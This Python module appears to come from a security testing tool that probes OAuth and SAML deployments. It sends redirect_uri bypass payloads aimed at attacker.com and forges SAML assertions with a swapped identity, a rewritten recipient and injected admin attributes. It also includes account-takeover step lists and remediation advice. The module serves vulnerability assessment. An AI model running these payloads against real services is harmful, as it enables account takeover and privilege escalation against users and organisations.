"""OAuth and SAML exploitation module

This module implements:
- OAuth redirect_uri bypass testing
- OAuth state parameter testing
- OAuth token leakage detection
- OAuth authorization code interception
- PKCE bypass testing
- SAML XML signature wrapping
- SAML assertion replay testing
- SAML attribute injection
- SAML privilege escalation
- Account takeover demonstration
"""

import base64
import hashlib
import re
import secrets
import xml.etree.ElementTree as ET
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from src.vulnchain.core.request_handler import RequestHandler, Response


class OAuthVulnerabilityType(Enum):
    """Types of OAuth vulnerabilities"""
    
    REDIRECT_URI_BYPASS = "redirect_uri_bypass"
    STATE_MISSING = "state_missing"
    STATE_NOT_VALIDATED = "state_not_validated"
    TOKEN_LEAKAGE = "token_leakage"
    CODE_INTERCEPTION = "code_interception"
    PKCE_BYPASS = "pkce_bypass"
    IMPLICIT_FLOW = "implicit_flow_insecure"
    OPEN_REDIRECT = "open_redirect"


class SAMLVulnerabilityType(Enum):
    """Types of SAML vulnerabilities"""
    
    SIGNATURE_WRAPPING = "signature_wrapping"
    ASSERTION_REPLAY = "assertion_replay"
    RECIPIENT_BYPASS = "recipient_bypass"
    ATTRIBUTE_INJECTION = "attribute_injection"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    UNSIGNED_ASSERTION = "unsigned_assertion"
    WEAK_SIGNATURE = "weak_signature"


@dataclass
class OAuthConfig:
    """OAuth configuration"""
    
    authorization_endpoint: str
    token_endpoint: str
    client_id: str
    client_secret: Optional[str] = None
    redirect_uri: str = ""
    scope: str = "openid profile email"
    response_type: str = "code"  # code, token, id_token
    grant_type: str = "authorization_code"
    use_pkce: bool = False


@dataclass
class OAuthTestResult:
    """Result of OAuth testing"""
    
    is_vulnerable: bool
    vulnerability_type: Optional[OAuthVulnerabilityType] = None
    confidence: float = 0.0
    evidence: List[str] = field(default_factory=list)
    malicious_redirect_uri: Optional[str] = None
    intercepted_code: Optional[str] = None
    intercepted_token: Optional[str] = None
    response: Optional[Response] = None
    exploitation_steps: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


@dataclass
class SAMLAssertion:
    """SAML assertion data"""
    
    raw_xml: str
    issuer: Optional[str] = None
    subject: Optional[str] = None
    attributes: Dict[str, str] = field(default_factory=dict)
    recipient: Optional[str] = None
    not_before: Optional[str] = None
    not_on_or_after: Optional[str] = None
    signature: Optional[str] = None
    is_signed: bool = False


@dataclass
class SAMLTestResult:
    """Result of SAML testing"""
    
    is_vulnerable: bool
    vulnerability_type: Optional[SAMLVulnerabilityType] = None
    confidence: float = 0.0
    evidence: List[str] = field(default_factory=list)
    original_assertion: Optional[SAMLAssertion] = None
    modified_assertion: Optional[str] = None
    response: Optional[Response] = None
    exploitation_steps: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)



class OAuthTester:
    """OAuth vulnerability detection and exploitation"""
    
    def __init__(self, request_handler: RequestHandler):
        """Initialize OAuth tester
        
        Args:
            request_handler: Request handler for HTTP communication
        """
        self.request_handler = request_handler
    
    async def test_oauth_flow(
        self,
        config: OAuthConfig,
    ) -> List[OAuthTestResult]:
        """Test OAuth flow for vulnerabilities
        
        Args:
            config: OAuth configuration
        
        Returns:
            List of OAuth test results
        """
        results = []
        
        # Test 1: redirect_uri bypass
        redirect_results = await self._test_redirect_uri_bypass(config)
        results.extend(redirect_results)
        
        # Test 2: State parameter issues
        state_result = await self._test_state_parameter(config)
        if state_result.is_vulnerable:
            results.append(state_result)
        
        # Test 3: Token leakage
        token_result = await self._test_token_leakage(config)
        if token_result.is_vulnerable:
            results.append(token_result)
        
        # Test 4: PKCE bypass (if PKCE is used)
        if config.use_pkce:
            pkce_result = await self._test_pkce_bypass(config)
            if pkce_result.is_vulnerable:
                results.append(pkce_result)
        
        # Test 5: Authorization code interception
        code_result = await self._test_code_interception(config)
        if code_result.is_vulnerable:
            results.append(code_result)
        
        return results
    
    async def _test_redirect_uri_bypass(
        self, config: OAuthConfig
    ) -> List[OAuthTestResult]:
        """Test for redirect_uri validation bypass
        
        Args:
            config: OAuth configuration
        
        Returns:
            List of OAuth test results
        """
        results = []
        
        # Various redirect_uri bypass techniques
        parsed_redirect = urlparse(config.redirect_uri)
        base_domain = parsed_redirect.netloc
        
        bypass_uris = [
            # Open redirect
            f"{config.redirect_uri}?next=https://attacker.com",
            # Path traversal
            f"{config.redirect_uri}/../attacker",
            # Subdomain bypass
            f"{parsed_redirect.scheme}://attacker.{base_domain}{parsed_redirect.path}",
            # Domain append
            f"{config.redirect_uri}.attacker.com",
            # Null byte injection
            f"{config.redirect_uri}%00.attacker.com",
            # @ symbol bypass
            f"{parsed_redirect.scheme}://{base_domain}@attacker.com{parsed_redirect.path}",
            # Backslash bypass
            f"{parsed_redirect.scheme}://{base_domain}\\attacker.com{parsed_redirect.path}",
            # Fragment bypass
            f"{config.redirect_uri}#@attacker.com",
        ]
        
        for malicious_uri in bypass_uris:
            result = await self._test_single_redirect_uri(config, malicious_uri)
            if result.is_vulnerable:
                results.append(result)
        
        return results
    
    async def _test_single_redirect_uri(
        self, config: OAuthConfig, malicious_uri: str
    ) -> OAuthTestResult:
        """Test a single redirect_uri bypass
        
        Args:
            config: OAuth configuration
            malicious_uri: Malicious redirect URI to test
        
        Returns:
            OAuth test result
        """
        # Build authorization URL with malicious redirect_uri
        state = secrets.token_urlsafe(16)
        
        params = {
            "client_id": config.client_id,
            "redirect_uri": malicious_uri,
            "response_type": config.response_type,
            "scope": config.scope,
            "state": state,
        }
        
        parsed = urlparse(config.authorization_endpoint)
        auth_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            urlencode(params),
            parsed.fragment,
        ))
        
        # Send request to authorization endpoint
        response = await self.request_handler.send_request(
            method="GET",
            url=auth_url,
            follow_redirects=False,
        )
        
        # Check if redirect_uri was accepted
        is_vulnerable = self._check_redirect_uri_accepted(response, malicious_uri)
        
        exploitation_steps = []
        if is_vulnerable:
            exploitation_steps = [
                f"1. Craft authorization URL with malicious redirect_uri: {malicious_uri}",
                f"2. Send victim to: {auth_url}",
                "3. Victim authorizes the application",
                f"4. Authorization code is sent to attacker's domain: {malicious_uri}",
                "5. Attacker exchanges code for access token",
                "6. Attacker gains access to victim's account",
            ]
        
        return OAuthTestResult(
            is_vulnerable=is_vulnerable,
            vulnerability_type=OAuthVulnerabilityType.REDIRECT_URI_BYPASS if is_vulnerable else None,
            confidence=0.90 if is_vulnerable else 0.0,
            evidence=[
                f"OAuth vulnerability: redirect_uri bypass",
                f"Malicious redirect_uri accepted: {malicious_uri}",
                f"Response status: {response.status_code}",
            ] if is_vulnerable else [
                f"redirect_uri validation enforced for: {malicious_uri}",
            ],
            malicious_redirect_uri=malicious_uri,
            response=response,
            exploitation_steps=exploitation_steps,
        )
    
    def _check_redirect_uri_accepted(
        self, response: Response, malicious_uri: str
    ) -> bool:
        """Check if malicious redirect_uri was accepted
        
        Args:
            response: Response from authorization endpoint
            malicious_uri: Malicious redirect URI
        
        Returns:
            True if accepted, False otherwise
        """
        # Check for error responses
        if response.status_code >= 400:
            return False
        
        # Check if response contains error parameter
        if "error=" in response.text.lower():
            return False
        
        # Check for common error messages
        error_patterns = [
            "invalid redirect_uri",
            "invalid_redirect_uri",
            "redirect_uri mismatch",
            "invalid redirect uri",
            "unauthorized redirect",
        ]
        
        response_lower = response.text.lower()
        if any(pattern in response_lower for pattern in error_patterns):
            return False
        
        # If we got a 200 or 302 without errors, likely accepted
        if response.status_code in [200, 302]:
            return True
        
        return False
    
    async def _test_state_parameter(self, config: OAuthConfig) -> OAuthTestResult:
        """Test for state parameter issues
        
        Args:
            config: OAuth configuration
        
        Returns:
            OAuth test result
        """
        # Test 1: Missing state parameter
        params = {
            "client_id": config.client_id,
            "redirect_uri": config.redirect_uri,
            "response_type": config.response_type,
            "scope": config.scope,
            # No state parameter
        }
        
        parsed = urlparse(config.authorization_endpoint)
        auth_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            urlencode(params),
            parsed.fragment,
        ))
        
        response = await self.request_handler.send_request(
            method="GET",
            url=auth_url,
            follow_redirects=False,
        )
        
        # Check if request succeeded without state
        is_vulnerable = response.status_code in [200, 302] and "error=" not in response.text.lower()
        
        vulnerability_type = OAuthVulnerabilityType.STATE_MISSING if is_vulnerable else None
        
        exploitation_steps = []
        if is_vulnerable:
            exploitation_steps = [
                "1. Craft authorization URL without state parameter",
                "2. Send victim to authorization URL",
                "3. Victim authorizes the application",
                "4. Attacker can perform CSRF attack by using their own authorization code",
                "5. Victim's account gets linked to attacker's OAuth account",
            ]
        
        return OAuthTestResult(
            is_vulnerable=is_vulnerable,
            vulnerability_type=vulnerability_type,
            confidence=0.85 if is_vulnerable else 0.0,
            evidence=[
                "OAuth vulnerability: State parameter not required",
                "Authorization request succeeded without state parameter",
                "CSRF attacks possible",
            ] if is_vulnerable else [
                "State parameter is required",
            ],
            response=response,
            exploitation_steps=exploitation_steps,
        )
    
    async def _test_token_leakage(self, config: OAuthConfig) -> OAuthTestResult:
        """Test for token leakage via Referer header
        
        Args:
            config: OAuth configuration
        
        Returns:
            OAuth test result
        """
        # Test implicit flow (token in URL fragment)
        if config.response_type in ["token", "id_token", "token id_token"]:
            exploitation_steps = [
                "1. Application uses implicit flow (token in URL fragment)",
                "2. Token is exposed in browser history",
                "3. Token can leak via Referer header when user clicks external links",
                "4. Attacker can capture token from Referer logs",
                "5. Attacker uses token to access victim's account",
            ]
            
            return OAuthTestResult(
                is_vulnerable=True,
                vulnerability_type=OAuthVulnerabilityType.IMPLICIT_FLOW,
                confidence=0.80,
                evidence=[
                    "OAuth vulnerability: Implicit flow used",
                    f"Response type: {config.response_type}",
                    "Tokens exposed in URL fragment",
                    "Token leakage via Referer header possible",
                ],
                exploitation_steps=exploitation_steps,
            )
        
        return OAuthTestResult(
            is_vulnerable=False,
            confidence=0.0,
            evidence=["Authorization code flow used (more secure)"],
        )
    
    async def _test_pkce_bypass(self, config: OAuthConfig) -> OAuthTestResult:
        """Test for PKCE bypass
        
        Args:
            config: OAuth configuration
        
        Returns:
            OAuth test result
        """
        # Test if PKCE can be bypassed by omitting code_challenge
        state = secrets.token_urlsafe(16)
        
        params = {
            "client_id": config.client_id,
            "redirect_uri": config.redirect_uri,
            "response_type": "code",
            "scope": config.scope,
            "state": state,
            # Omit code_challenge and code_challenge_method
        }
        
        parsed = urlparse(config.authorization_endpoint)
        auth_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            urlencode(params),
            parsed.fragment,
        ))
        
        response = await self.request_handler.send_request(
            method="GET",
            url=auth_url,
            follow_redirects=False,
        )
        
        # Check if request succeeded without PKCE
        is_vulnerable = response.status_code in [200, 302] and "error=" not in response.text.lower()
        
        exploitation_steps = []
        if is_vulnerable:
            exploitation_steps = [
                "1. PKCE is not enforced by the authorization server",
                "2. Attacker can intercept authorization code without code_verifier",
                "3. Craft authorization URL without code_challenge",
                "4. Victim authorizes the application",
                "5. Attacker intercepts authorization code from redirect",
                "6. Attacker exchanges code for token without code_verifier",
                "7. Attacker gains access to victim's account",
            ]
        
        return OAuthTestResult(
            is_vulnerable=is_vulnerable,
            vulnerability_type=OAuthVulnerabilityType.PKCE_BYPASS if is_vulnerable else None,
            confidence=0.90 if is_vulnerable else 0.0,
            evidence=[
                "OAuth vulnerability: PKCE bypass",
                "Authorization succeeded without code_challenge",
                "PKCE not enforced",
            ] if is_vulnerable else [
                "PKCE is enforced",
            ],
            response=response,
            exploitation_steps=exploitation_steps,
        )
    
    async def _test_code_interception(self, config: OAuthConfig) -> OAuthTestResult:
        """Test for authorization code interception
        
        Args:
            config: OAuth configuration
        
        Returns:
            OAuth test result
        """
        # This test demonstrates the risk of code interception
        # In a real scenario, attacker would need to intercept the redirect
        
        exploitation_steps = [
            "1. Attacker tricks victim into authorizing application",
            "2. Authorization code is sent to redirect_uri",
            "3. If redirect_uri uses HTTP (not HTTPS), code can be intercepted",
            "4. If redirect_uri is on attacker-controlled domain, code is captured",
            "5. Attacker exchanges code for access token",
            "6. Attacker gains access to victim's account",
        ]
        
        # Check if redirect_uri uses HTTP
        parsed_redirect = urlparse(config.redirect_uri)
        uses_http = parsed_redirect.scheme == "http"
        
        return OAuthTestResult(
            is_vulnerable=uses_http,
            vulnerability_type=OAuthVulnerabilityType.CODE_INTERCEPTION if uses_http else None,
            confidence=0.70 if uses_http else 0.0,
            evidence=[
                "OAuth vulnerability: Code interception risk",
                f"redirect_uri uses HTTP: {config.redirect_uri}",
                "Authorization code can be intercepted over insecure connection",
            ] if uses_http else [
                "redirect_uri uses HTTPS (secure)",
            ],
            exploitation_steps=exploitation_steps if uses_http else [],
        )



class SAMLTester:
    """SAML vulnerability detection and exploitation"""
    
    def __init__(self, request_handler: RequestHandler):
        """Initialize SAML tester
        
        Args:
            request_handler: Request handler for HTTP communication
        """
        self.request_handler = request_handler
    
    async def test_saml_assertion(
        self,
        assertion_xml: str,
        acs_url: str,
    ) -> List[SAMLTestResult]:
        """Test SAML assertion for vulnerabilities
        
        Args:
            assertion_xml: SAML assertion XML
            acs_url: Assertion Consumer Service URL
        
        Returns:
            List of SAML test results
        """
        results = []
        
        # Parse the assertion
        assertion = self._parse_saml_assertion(assertion_xml)
        
        # Test 1: XML signature wrapping
        wrapping_result = await self._test_signature_wrapping(assertion, acs_url)
        if wrapping_result.is_vulnerable:
            results.append(wrapping_result)
        
        # Test 2: Assertion replay
        replay_result = await self._test_assertion_replay(assertion, acs_url)
        if replay_result.is_vulnerable:
            results.append(replay_result)
        
        # Test 3: Recipient validation bypass
        recipient_result = await self._test_recipient_bypass(assertion, acs_url)
        if recipient_result.is_vulnerable:
            results.append(recipient_result)
        
        # Test 4: Attribute injection
        attribute_result = await self._test_attribute_injection(assertion, acs_url)
        if attribute_result.is_vulnerable:
            results.append(attribute_result)
        
        return results
    
    def _parse_saml_assertion(self, assertion_xml: str) -> SAMLAssertion:
        """Parse SAML assertion XML
        
        Args:
            assertion_xml: SAML assertion XML string
        
        Returns:
            SAMLAssertion object
        """
        try:
            root = ET.fromstring(assertion_xml)
            
            # Define namespaces
            ns = {
                'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
                'ds': 'http://www.w3.org/2000/09/xmldsig#',
            }
            
            # Extract issuer
            issuer_elem = root.find('.//saml:Issuer', ns)
            issuer = issuer_elem.text if issuer_elem is not None else None
            
            # Extract subject
            subject_elem = root.find('.//saml:Subject/saml:NameID', ns)
            subject = subject_elem.text if subject_elem is not None else None
            
            # Extract attributes
            attributes = {}
            for attr in root.findall('.//saml:Attribute', ns):
                attr_name = attr.get('Name')
                attr_value_elem = attr.find('saml:AttributeValue', ns)
                if attr_name and attr_value_elem is not None:
                    attributes[attr_name] = attr_value_elem.text or ""
            
            # Extract recipient
            recipient_elem = root.find('.//saml:SubjectConfirmationData', ns)
            recipient = recipient_elem.get('Recipient') if recipient_elem is not None else None
            
            # Extract time constraints
            conditions_elem = root.find('.//saml:Conditions', ns)
            not_before = conditions_elem.get('NotBefore') if conditions_elem is not None else None
            not_on_or_after = conditions_elem.get('NotOnOrAfter') if conditions_elem is not None else None
            
            # Check for signature
            signature_elem = root.find('.//ds:Signature', ns)
            is_signed = signature_elem is not None
            signature = ET.tostring(signature_elem, encoding='unicode') if is_signed else None
            
            return SAMLAssertion(
                raw_xml=assertion_xml,
                issuer=issuer,
                subject=subject,
                attributes=attributes,
                recipient=recipient,
                not_before=not_before,
                not_on_or_after=not_on_or_after,
                signature=signature,
                is_signed=is_signed,
            )
        except Exception as e:
            # Return minimal assertion on parse error
            return SAMLAssertion(
                raw_xml=assertion_xml,
                is_signed=False,
            )
    
    async def _test_signature_wrapping(
        self, assertion: SAMLAssertion, acs_url: str
    ) -> SAMLTestResult:
        """Test for XML signature wrapping attack
        
        Args:
            assertion: Original SAML assertion
            acs_url: Assertion Consumer Service URL
        
        Returns:
            SAML test result
        """
        if not assertion.is_signed:
            return SAMLTestResult(
                is_vulnerable=False,
                confidence=0.0,
                evidence=["Assertion is not signed, signature wrapping not applicable"],
            )
        
        # Create wrapped assertion
        # This is a simplified example - real signature wrapping is more complex
        wrapped_xml = self._create_wrapped_assertion(assertion)
        
        # Send wrapped assertion to ACS
        response = await self._send_saml_assertion(wrapped_xml, acs_url)
        
        # Check if wrapped assertion was accepted
        is_vulnerable = self._check_saml_accepted(response)
        
        exploitation_steps = []
        if is_vulnerable:
            exploitation_steps = [
                "1. Intercept legitimate SAML assertion",
                "2. Create malicious assertion with attacker's identity",
                "3. Wrap malicious assertion around legitimate signed assertion",
                "4. Signature validation passes on legitimate assertion",
                "5. Application processes malicious assertion instead",
                "6. Attacker gains access as victim or with elevated privileges",
            ]
        
        return SAMLTestResult(
            is_vulnerable=is_vulnerable,
            vulnerability_type=SAMLVulnerabilityType.SIGNATURE_WRAPPING if is_vulnerable else None,
            confidence=0.95 if is_vulnerable else 0.0,
            evidence=[
                "SAML vulnerability: XML signature wrapping",
                "Wrapped assertion was accepted",
                "Signature validation bypassed",
            ] if is_vulnerable else [
                "Signature wrapping protection in place",
            ],
            original_assertion=assertion,
            modified_assertion=wrapped_xml,
            response=response,
            exploitation_steps=exploitation_steps,
        )
    
    def _create_wrapped_assertion(self, assertion: SAMLAssertion) -> str:
        """Create a wrapped SAML assertion for signature wrapping attack
        
        Args:
            assertion: Original assertion
        
        Returns:
            Wrapped assertion XML
        """
        # This is a simplified example
        # Real signature wrapping involves complex XML manipulation
        
        # Create malicious assertion with attacker's identity
        malicious_assertion = assertion.raw_xml.replace(
            f"<saml:NameID>{assertion.subject}</saml:NameID>",
            "<saml:NameID>attacker@evil.com</saml:NameID>"
        )
        
        # Wrap it around the original signed assertion
        wrapped = f"""<saml:Response>
    <saml:Assertion>
        {malicious_assertion}
    </saml:Assertion>
    <saml:Assertion>
        {assertion.raw_xml}
    </saml:Assertion>
</saml:Response>"""
        
        return wrapped
    
    async def _test_assertion_replay(
        self, assertion: SAMLAssertion, acs_url: str
    ) -> SAMLTestResult:
        """Test for assertion replay attack
        
        Args:
            assertion: Original SAML assertion
            acs_url: Assertion Consumer Service URL
        
        Returns:
            SAML test result
        """
        # Send the same assertion twice
        response1 = await self._send_saml_assertion(assertion.raw_xml, acs_url)
        response2 = await self._send_saml_assertion(assertion.raw_xml, acs_url)
        
        # Check if second submission was accepted
        is_vulnerable = self._check_saml_accepted(response2)
        
        exploitation_steps = []
        if is_vulnerable:
            exploitation_steps = [
                "1. Intercept legitimate SAML assertion",
                "2. Store the assertion for later use",
                "3. Replay the assertion to ACS endpoint",
                "4. Assertion is accepted without replay detection",
                "5. Attacker gains authenticated session",
                "6. Can be used for session hijacking or privilege escalation",
            ]
        
        return SAMLTestResult(
            is_vulnerable=is_vulnerable,
            vulnerability_type=SAMLVulnerabilityType.ASSERTION_REPLAY if is_vulnerable else None,
            confidence=0.90 if is_vulnerable else 0.0,
            evidence=[
                "SAML vulnerability: Assertion replay",
                "Same assertion accepted multiple times",
                "No replay protection (nonce/timestamp validation)",
            ] if is_vulnerable else [
                "Assertion replay protection in place",
            ],
            original_assertion=assertion,
            response=response2,
            exploitation_steps=exploitation_steps,
        )
    
    async def _test_recipient_bypass(
        self, assertion: SAMLAssertion, acs_url: str
    ) -> SAMLTestResult:
        """Test for recipient validation bypass
        
        Args:
            assertion: Original SAML assertion
            acs_url: Assertion Consumer Service URL
        
        Returns:
            SAML test result
        """
        # Modify recipient to attacker's URL
        modified_xml = assertion.raw_xml
        if assertion.recipient:
            modified_xml = modified_xml.replace(
                f'Recipient="{assertion.recipient}"',
                'Recipient="https://attacker.com/acs"'
            )
        
        # Send modified assertion
        response = await self._send_saml_assertion(modified_xml, acs_url)
        
        # Check if modified assertion was accepted
        is_vulnerable = self._check_saml_accepted(response)
        
        exploitation_steps = []
        if is_vulnerable:
            exploitation_steps = [
                "1. Intercept SAML assertion intended for legitimate service",
                "2. Modify Recipient attribute to attacker's ACS URL",
                "3. Send modified assertion to attacker's service",
                "4. Attacker's service accepts assertion without recipient validation",
                "5. Attacker gains authenticated session with victim's identity",
            ]
        
        return SAMLTestResult(
            is_vulnerable=is_vulnerable,
            vulnerability_type=SAMLVulnerabilityType.RECIPIENT_BYPASS if is_vulnerable else None,
            confidence=0.85 if is_vulnerable else 0.0,
            evidence=[
                "SAML vulnerability: Recipient validation bypass",
                "Modified recipient was accepted",
                f"Original recipient: {assertion.recipient}",
                "Modified recipient: https://attacker.com/acs",
            ] if is_vulnerable else [
                "Recipient validation is enforced",
            ],
            original_assertion=assertion,
            modified_assertion=modified_xml,
            response=response,
            exploitation_steps=exploitation_steps,
        )
    
    async def _test_attribute_injection(
        self, assertion: SAMLAssertion, acs_url: str
    ) -> SAMLTestResult:
        """Test for attribute injection and privilege escalation
        
        Args:
            assertion: Original SAML assertion
            acs_url: Assertion Consumer Service URL
        
        Returns:
            SAML test result
        """
        # Inject admin/privileged attributes
        modified_xml = assertion.raw_xml
        
        # Try to inject admin role
        if '<saml:AttributeStatement>' in modified_xml:
            admin_attribute = '''
    <saml:Attribute Name="role">
        <saml:AttributeValue>admin</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="isAdmin">
        <saml:AttributeValue>true</saml:AttributeValue>
    </saml:Attribute>'''
            
            modified_xml = modified_xml.replace(
                '</saml:AttributeStatement>',
                f'{admin_attribute}\n</saml:AttributeStatement>'
            )
        
        # Send modified assertion
        response = await self._send_saml_assertion(modified_xml, acs_url)
        
        # Check if modified assertion was accepted
        is_vulnerable = self._check_saml_accepted(response)
        
        # Additional check: look for admin indicators in response
        if is_vulnerable:
            response_lower = response.text.lower()
            admin_indicators = ['admin', 'administrator', 'elevated', 'privileged']
            has_admin_access = any(indicator in response_lower for indicator in admin_indicators)
            is_vulnerable = is_vulnerable and has_admin_access
        
        exploitation_steps = []
        if is_vulnerable:
            exploitation_steps = [
                "1. Intercept legitimate SAML assertion",
                "2. Inject malicious attributes (role=admin, isAdmin=true)",
                "3. Send modified assertion to ACS",
                "4. Application accepts injected attributes without validation",
                "5. Attacker gains elevated privileges",
                "6. Account takeover with administrative access achieved",
            ]
        
        return SAMLTestResult(
            is_vulnerable=is_vulnerable,
            vulnerability_type=SAMLVulnerabilityType.ATTRIBUTE_INJECTION if is_vulnerable else None,
            confidence=0.90 if is_vulnerable else 0.0,
            evidence=[
                "SAML vulnerability: Attribute injection",
                "Injected admin attributes were accepted",
                "Privilege escalation successful",
            ] if is_vulnerable else [
                "Attribute injection protection in place",
            ],
            original_assertion=assertion,
            modified_assertion=modified_xml,
            response=response,
            exploitation_steps=exploitation_steps,
        )
    
    async def _send_saml_assertion(
        self, assertion_xml: str, acs_url: str
    ) -> Response:
        """Send SAML assertion to ACS endpoint
        
        Args:
            assertion_xml: SAML assertion XML
            acs_url: Assertion Consumer Service URL
        
        Returns:
            Response object
        """
        # Encode assertion as base64
        assertion_b64 = base64.b64encode(assertion_xml.encode()).decode()
        
        # Send POST request to ACS
        response = await self.request_handler.send_request(
            method="POST",
            url=acs_url,
            data={"SAMLResponse": assertion_b64},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        
        return response
    
    def _check_saml_accepted(self, response: Response) -> bool:
        """Check if SAML assertion was accepted
        
        Args:
            response: Response from ACS
        
        Returns:
            True if accepted, False otherwise
        """
        # Check for success indicators
        if response.status_code in [200, 302]:
            # Check for error messages
            error_patterns = [
                "saml error",
                "invalid assertion",
                "signature verification failed",
                "assertion expired",
                "replay detected",
                "invalid recipient",
            ]
            
            response_lower = response.text.lower()
            has_error = any(pattern in response_lower for pattern in error_patterns)
            
            if not has_error:
                return True
        
        return False



class AccountTakeoverDemo:
    """Demonstrate account takeover via OAuth/SAML vulnerabilities"""
    
    @staticmethod
    def generate_oauth_takeover_steps(
        results: List[OAuthTestResult],
    ) -> List[str]:
        """Generate step-by-step OAuth account takeover demonstration
        
        Args:
            results: List of OAuth test results
        
        Returns:
            List of exploitation steps
        """
        if not results:
            return ["No OAuth vulnerabilities found"]
        
        # Find the most critical vulnerability
        vulnerable_results = [r for r in results if r.is_vulnerable]
        if not vulnerable_results:
            return ["No exploitable OAuth vulnerabilities found"]
        
        # Prioritize vulnerabilities
        priority_order = [
            OAuthVulnerabilityType.REDIRECT_URI_BYPASS,
            OAuthVulnerabilityType.STATE_MISSING,
            OAuthVulnerabilityType.PKCE_BYPASS,
            OAuthVulnerabilityType.CODE_INTERCEPTION,
            OAuthVulnerabilityType.TOKEN_LEAKAGE,
        ]
        
        selected_result = None
        for vuln_type in priority_order:
            for result in vulnerable_results:
                if result.vulnerability_type == vuln_type:
                    selected_result = result
                    break
            if selected_result:
                break
        
        if not selected_result:
            selected_result = vulnerable_results[0]
        
        steps = [
            "=== OAuth Account Takeover Demonstration ===",
            "",
            f"Vulnerability: {selected_result.vulnerability_type.value if selected_result.vulnerability_type else 'Unknown'}",
            f"Confidence: {selected_result.confidence * 100:.0f}%",
            "",
            "Exploitation Steps:",
        ]
        
        steps.extend(selected_result.exploitation_steps)
        
        steps.extend([
            "",
            "=== Impact ===",
            "- Attacker gains full access to victim's account",
            "- Can read private data, messages, and personal information",
            "- Can perform actions on behalf of the victim",
            "- Can modify account settings and data",
            "- May lead to further compromise of connected services",
            "",
            "=== Remediation ===",
            "- Implement strict redirect_uri validation (exact match)",
            "- Always require and validate state parameter",
            "- Enforce PKCE for public clients",
            "- Use authorization code flow instead of implicit flow",
            "- Implement proper token binding",
            "- Use HTTPS for all redirect URIs",
            "- Implement rate limiting and anomaly detection",
        ])
        
        return steps
    
    @staticmethod
    def generate_saml_takeover_steps(
        results: List[SAMLTestResult],
    ) -> List[str]:
        """Generate step-by-step SAML account takeover demonstration
        
        Args:
            results: List of SAML test results
        
        Returns:
            List of exploitation steps
        """
        if not results:
            return ["No SAML vulnerabilities found"]
        
        # Find the most critical vulnerability
        vulnerable_results = [r for r in results if r.is_vulnerable]
        if not vulnerable_results:
            return ["No exploitable SAML vulnerabilities found"]
        
        # Prioritize vulnerabilities
        priority_order = [
            SAMLVulnerabilityType.SIGNATURE_WRAPPING,
            SAMLVulnerabilityType.ATTRIBUTE_INJECTION,
            SAMLVulnerabilityType.ASSERTION_REPLAY,
            SAMLVulnerabilityType.RECIPIENT_BYPASS,
        ]
        
        selected_result = None
        for vuln_type in priority_order:
            for result in vulnerable_results:
                if result.vulnerability_type == vuln_type:
                    selected_result = result
                    break
            if selected_result:
                break
        
        if not selected_result:
            selected_result = vulnerable_results[0]
        
        steps = [
            "=== SAML Account Takeover Demonstration ===",
            "",
            f"Vulnerability: {selected_result.vulnerability_type.value if selected_result.vulnerability_type else 'Unknown'}",
            f"Confidence: {selected_result.confidence * 100:.0f}%",
            "",
            "Exploitation Steps:",
        ]
        
        steps.extend(selected_result.exploitation_steps)
        
        steps.extend([
            "",
            "=== Impact ===",
            "- Attacker gains authenticated access to victim's account",
            "- Can bypass authentication entirely",
            "- May gain elevated privileges (admin access)",
            "- Can access sensitive data and perform privileged operations",
            "- May compromise entire SSO infrastructure",
            "",
            "=== Remediation ===",
            "- Implement proper XML signature validation",
            "- Validate assertion structure before signature verification",
            "- Implement assertion replay protection (nonce/timestamp)",
            "- Validate recipient attribute matches ACS URL",
            "- Validate and sanitize all assertion attributes",
            "- Use XML canonicalization properly",
            "- Implement strict XML parsing (disable external entities)",
            "- Use modern SAML libraries with security patches",
        ])
        
        return steps


# Convenience functions for testing

async def test_oauth_vulnerabilities(
    authorization_endpoint: str,
    token_endpoint: str,
    client_id: str,
    redirect_uri: str,
    request_handler: RequestHandler,
    client_secret: Optional[str] = None,
    use_pkce: bool = False,
) -> Tuple[List[OAuthTestResult], List[str]]:
    """Test OAuth flow for vulnerabilities
    
    Args:
        authorization_endpoint: OAuth authorization endpoint
        token_endpoint: OAuth token endpoint
        client_id: OAuth client ID
        redirect_uri: OAuth redirect URI
        request_handler: Request handler instance
        client_secret: Optional client secret
        use_pkce: Whether PKCE is used
    
    Returns:
        Tuple of (test results, account takeover steps)
    """
    config = OAuthConfig(
        authorization_endpoint=authorization_endpoint,
        token_endpoint=token_endpoint,
        client_id=client_id,
        client_secret=client_secret,
        redirect_uri=redirect_uri,
        use_pkce=use_pkce,
    )
    
    tester = OAuthTester(request_handler)
    results = await tester.test_oauth_flow(config)
    
    takeover_steps = AccountTakeoverDemo.generate_oauth_takeover_steps(results)
    
    return results, takeover_steps


async def test_saml_vulnerabilities(
    assertion_xml: str,
    acs_url: str,
    request_handler: RequestHandler,
) -> Tuple[List[SAMLTestResult], List[str]]:
    """Test SAML assertion for vulnerabilities
    
    Args:
        assertion_xml: SAML assertion XML
        acs_url: Assertion Consumer Service URL
        request_handler: Request handler instance
    
    Returns:
        Tuple of (test results, account takeover steps)
    """
    tester = SAMLTester(request_handler)
    results = await tester.test_saml_assertion(assertion_xml, acs_url)
    
    takeover_steps = AccountTakeoverDemo.generate_saml_takeover_steps(results)
    
    return results, takeover_steps
